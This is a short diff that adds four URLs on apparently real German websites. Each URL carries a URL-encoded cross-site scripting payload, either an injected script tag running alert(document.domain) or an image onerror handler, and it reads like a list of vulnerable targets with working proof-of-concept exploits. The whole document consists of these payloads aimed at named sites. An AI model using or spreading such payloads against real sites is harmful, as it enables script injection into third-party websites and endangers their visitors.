@@ -1,0 +1,4 @@
+http://feldbergturm.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://feldhofensche-apotheke.de/calendar_form.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+http://felixgiese.de/weibo/topic/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://feltloom.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
